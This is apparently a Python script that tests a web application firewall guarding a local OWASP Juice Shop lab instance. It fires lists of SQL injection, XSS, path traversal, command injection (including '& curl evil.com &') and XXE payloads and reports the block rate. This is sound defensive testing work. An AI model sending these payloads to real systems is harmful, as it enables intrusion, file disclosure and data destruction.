#!/usr/bin/env python3
"""
OWASP Juice Shop WAF Comprehensive Testing Script
Python version with proper encoding and all attack categories
"""

import requests
import json
import time
import sys
from datetime import datetime
from typing import Dict, List, Tuple
from urllib.parse import quote

# Configuration
WAF_URL = "http://localhost:8080"
OUTPUT_DIR = "./test_results"

# Colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    NC = '\033[0m'

class WAFTester:
    def __init__(self):
        self.results = {
            "total": 0,
            "blocked": 0,
            "bypassed": 0,
            "failed": 0,
            "categories": {}
        }
        self.detailed_results = []
        
    def test_payload(self, category: str, name: str, method: str, 
                     endpoint: str, payload=None, headers=None, 
                     query_params=None) -> Tuple[str, str]:
        """Test a single payload"""
        self.results["total"] += 1
        
        if category not in self.results["categories"]:
            self.results["categories"][category] = {"total": 0, "blocked": 0}
        self.results["categories"][category]["total"] += 1
        
        url = f"{WAF_URL}{endpoint}"
        
        try:
            if method.upper() == "GET":
                response = requests.get(url, params=query_params, headers=headers, timeout=5)
            elif method.upper() == "POST":
                headers = headers or {}
                if isinstance(payload, dict):
                    headers['Content-Type'] = 'application/json'
                    response = requests.post(url, json=payload, headers=headers, timeout=5)
                else:
                    headers['Content-Type'] = 'application/xml'
                    response = requests.post(url, data=payload, headers=headers, timeout=5)
            else:
                return ("FAILED", "Unsupported method")
            
            # Check if blocked
            if response.status_code in [403, 429]:
                self.results["blocked"] += 1
                self.results["categories"][category]["blocked"] += 1
                return ("BLOCKED", f"HTTP {response.status_code}")
            
            if "blocked" in response.text.lower() or "access denied" in response.text.lower():
                self.results["blocked"] += 1
                self.results["categories"][category]["blocked"] += 1
                return ("BLOCKED", "Block page detected")
            
            # Check if exploit succeeded
            if response.status_code == 200:
                if category == "sqli":
                    if "token" in response.text.lower() or '"authentication"' in response.text:
                        self.results["bypassed"] += 1
                        return ("BYPASSED", "SQLi successful")
                elif category == "xss":
                    if "<script" in response.text or "alert(" in response.text:
                        self.results["bypassed"] += 1
                        return ("BYPASSED", "XSS reflected")
                
                self.results["failed"] += 1
                return ("FAILED", f"Passed WAF (HTTP {response.status_code})")
            
            self.results["failed"] += 1
            return ("FAILED", f"HTTP {response.status_code}")
            
        except requests.exceptions.Timeout:
            self.results["failed"] += 1
            return ("FAILED", "Timeout")
        except Exception as e:
            self.results["failed"] += 1
            return ("FAILED", str(e))
    
    def print_result(self, category: str, name: str, status: str, reason: str):
        """Print colored result"""
        if status == "BLOCKED":
            symbol = f"{Colors.GREEN}✓ BLOCKED{Colors.NC}"
        elif status == "BYPASSED":
            symbol = f"{Colors.RED}✗ BYPASSED{Colors.NC}"
        else:
            symbol = f"{Colors.YELLOW}○ FAILED{Colors.NC}"
        
        print(f"  {symbol} {name}: {reason}")
        
        self.detailed_results.append({
            "category": category,
            "name": name,
            "status": status,
            "reason": reason,
            "timestamp": datetime.now().isoformat()
        })
    
    def run_sqli_tests(self):
        """SQL Injection comprehensive tests"""
        print(f"\n{Colors.BLUE}=== SQL Injection Tests ==={Colors.NC}")
        
        # Authentication bypass tests
        tests = [
            ("Classic admin'--", "POST", "/rest/user/login", 
             {"email": "admin'--", "password": "x"}),
            ("OR 1=1 bypass", "POST", "/rest/user/login",
             {"email": "' OR 1=1--", "password": ""}),
            ("OR 'a'='a' bypass", "POST", "/rest/user/login",
             {"email": "admin' OR 'a'='a'--", "password": ""}),
            ("UNION SELECT", "POST", "/rest/user/login",
             {"email": "' UNION SELECT * FROM users--", "password": "x"}),
        ]
        
        for name, method, endpoint, payload in tests:
            status, reason = self.test_payload("sqli", name, method, endpoint, payload)
            self.print_result("sqli", name, status, reason)
            time.sleep(0.1)
        
        # Search-based SQLi
        search_tests = [
            ("Boolean-based AND 1=1", {"q": "apple' AND 1=1--"}),
            ("Time-based SLEEP", {"q": "apple' AND SLEEP(2)--"}),
            ("Error-based extractvalue", {"q": "' AND extractvalue(1,concat(0x7e,version()))--"}),
            ("Stacked queries DROP", {"q": "'; DROP TABLE users--"}),
            ("PostgreSQL pg_sleep", {"q": "'; SELECT pg_sleep(2)--"}),
        ]
        
        for name, params in search_tests:
            status, reason = self.test_payload("sqli", name, "GET", "/rest/products/search", 
                                               query_params=params)
            self.print_result("sqli", name, status, reason)
            time.sleep(0.1)
    
    def run_xss_tests(self):
        """XSS comprehensive tests"""
        print(f"\n{Colors.BLUE}=== XSS Tests ==={Colors.NC}")
        
        tests = [
            ("Basic <script>", {"q": "<script>alert(1)</script>"}),
            ("IMG onerror", {"q": "<img src=x onerror=alert(1)>"}),
            ("SVG onload", {"q": "<svg onload=alert(1)>"}),
            ("Iframe javascript", {"q": '<iframe src="javascript:alert(1)">'}),
            ("Body onload", {"q": "<body onload=alert(1)>"}),
            ("IMG onclick", {"q": "<img src=x onclick=alert(1)>"}),
            ("Video onerror", {"q": "<video onerror=alert(1)>"}),
            ("Audio onerror", {"q": "<audio onerror=alert(1)>"}),
        ]
        
        for name, params in tests:
            status, reason = self.test_payload("xss", name, "GET", "/rest/products/search",
                                               query_params=params)
            self.print_result("xss", name, status, reason)
            time.sleep(0.1)
    
    def run_path_traversal_tests(self):
        """Path traversal tests"""
        print(f"\n{Colors.BLUE}=== Path Traversal Tests ==={Colors.NC}")
        
        tests = [
            ("Basic ../../../etc/passwd", "/ftp/../../../etc/passwd"),
            ("URL encoded", "/ftp/..%2f..%2f..%2fetc%2fpasswd"),
            ("Windows path", "/ftp/..\\..\\..\\windows\\win.ini"),
            ("Null byte", "/ftp/../../../etc/passwd%00.txt"),
        ]
        
        for name, endpoint in tests:
            status, reason = self.test_payload("path-traversal", name, "GET", endpoint)
            self.print_result("path-traversal", name, status, reason)
            time.sleep(0.1)
    
    def run_rce_tests(self):
        """Command injection tests"""
        print(f"\n{Colors.BLUE}=== Command Injection Tests ==={Colors.NC}")
        
        tests = [
            ("Semicolon ls", {"q": "; ls -la"}),
            ("Pipe whoami", {"q": "| whoami"}),
            ("Backtick cat", {"q": "`cat /etc/passwd`"}),
            ("Dollar subshell", {"q": "$(whoami)"}),
            ("Ampersand curl", {"q": "& curl evil.com &"}),
        ]
        
        for name, params in tests:
            status, reason = self.test_payload("rce", name, "GET", "/rest/products/search",
                                               query_params=params)
            self.print_result("rce", name, status, reason)
            time.sleep(0.1)
    
    def run_xxe_tests(self):
        """XXE tests"""
        print(f"\n{Colors.BLUE}=== XXE Tests ==={Colors.NC}")
        
        tests = [
            ("Basic XXE", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><feedback>&xxe;</feedback>'),
            ("php:// wrapper", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><feedback>&xxe;</feedback>'),
        ]
        
        for name, payload in tests:
            status, reason = self.test_payload("xxe", name, "POST", "/api/feedback", payload=payload)
            self.print_result("xxe", name, status, reason)
            time.sleep(0.1)
    
    def generate_report(self):
        """Generate final report"""
        print(f"\n{Colors.BLUE}{'='*60}{Colors.NC}")
        print(f"{Colors.BLUE}=== Final Results ==={Colors.NC}")
        print(f"{Colors.BLUE}{'='*60}{Colors.NC}\n")
        
        total = self.results["total"]
        blocked = self.results["blocked"]
        bypassed = self.results["bypassed"]
        failed = self.results["failed"]
        
        blocked_pct = (blocked / total * 100) if total > 0 else 0
        
        print(f"Total Tests:       {total}")
        print(f"{Colors.GREEN}Blocked:           {blocked} ({blocked_pct:.1f}%){Colors.NC}")
        print(f"{Colors.RED}Bypassed:          {bypassed}{Colors.NC}")
        print(f"{Colors.YELLOW}Failed Exploits:   {failed}{Colors.NC}")
        
        print(f"\n{Colors.BLUE}=== Per-Category Results ==={Colors.NC}\n")
        for cat, stats in self.results["categories"].items():
            cat_total = stats["total"]
            cat_blocked = stats["blocked"]
            cat_pct = (cat_blocked / cat_total * 100) if cat_total > 0 else 0
            print(f"{cat}: {cat_blocked}/{cat_total} blocked ({cat_pct:.1f}%)")
        
        # Save report
        import os
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        report_file = f"{OUTPUT_DIR}/waf_python_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump({
                "summary": self.results,
                "detailed_results": self.detailed_results
            }, f, indent=2)
        
        print(f"\n{Colors.GREEN}Report saved: {report_file}{Colors.NC}")
        
        # Assessment
        print(f"\n{Colors.BLUE}=== Assessment ==={Colors.NC}\n")
        if blocked_pct >= 80:
            print(f"{Colors.GREEN}✓ EXCELLENT protection ({blocked_pct:.1f}%){Colors.NC}")
        elif blocked_pct >= 60:
            print(f"{Colors.YELLOW}○ GOOD protection ({blocked_pct:.1f}%){Colors.NC}")
        else:
            print(f"{Colors.RED}⚠ NEEDS IMPROVEMENT ({blocked_pct:.1f}%){Colors.NC}")

def main():
    print(f"{Colors.BLUE}{'='*60}{Colors.NC}")
    print(f"{Colors.BLUE}OWASP Juice Shop - Python WAF Testing{Colors.NC}")
    print(f"{Colors.BLUE}{'='*60}{Colors.NC}")
    
    # Check connectivity
    try:
        r = requests.get(f"{WAF_URL}/rest/admin/application-version", timeout=5)
        print(f"{Colors.GREEN}✓ WAF is reachable{Colors.NC}")
    except:
        print(f"{Colors.RED}✗ Cannot reach WAF at {WAF_URL}{Colors.NC}")
        sys.exit(1)
    
    tester = WAFTester()
    
    # Run all test suites
    tester.run_sqli_tests()
    tester.run_xss_tests()
    tester.run_path_traversal_tests()
    tester.run_rce_tests()
    tester.run_xxe_tests()
    
    # Generate report
    tester.generate_report()

if __name__ == "__main__":
    main()
